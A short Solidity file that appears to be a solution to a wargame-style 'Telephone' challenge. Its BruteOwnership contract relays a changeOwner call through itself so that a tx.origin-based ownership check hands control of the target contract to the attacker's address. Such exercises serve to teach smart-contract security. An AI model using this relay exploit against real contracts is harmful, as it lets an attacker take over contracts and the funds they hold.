pragma solidity ^0.4.18;

contract Telephone {
    function changeOwner(address _owner) public;
}

contract BruteOwnership {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function changeOwner(address _telephone) public {
        Telephone tele = Telephone(_telephone);

        tele.changeOwner(owner);
    }
}
